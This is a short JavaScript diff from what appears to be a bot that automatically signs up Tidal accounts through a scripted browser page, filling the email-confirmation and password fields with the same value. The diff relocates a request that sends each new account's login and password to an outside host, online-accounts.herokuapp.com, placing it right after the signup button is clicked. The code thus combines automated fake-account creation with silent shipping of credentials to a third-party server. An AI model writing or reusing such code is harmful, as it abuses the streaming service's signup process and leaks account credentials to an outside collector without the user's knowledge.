@@ -163,7 +163,6 @@ const main = async () => {
         await tidalLog.cls()
       }
 
-      request('https://online-accounts.herokuapp.com/addAccount?tidal:' + m + ':' + m, function (error, response, body) { })
     }
 
     tidalConnect(email)
@@ -184,6 +183,8 @@ const main = async () => {
       await page.inst('[name="emailConfirm"]', tMail)
       await page.inst('[name="password"]', tMail)
       await page.clk('.btn-full')
+
+      request('https://online-accounts.herokuapp.com/addAccount?tidal:' + tMail + ':' + tMail, function (error, response, body) { })
 
       tidalConnect(tMail)
     }
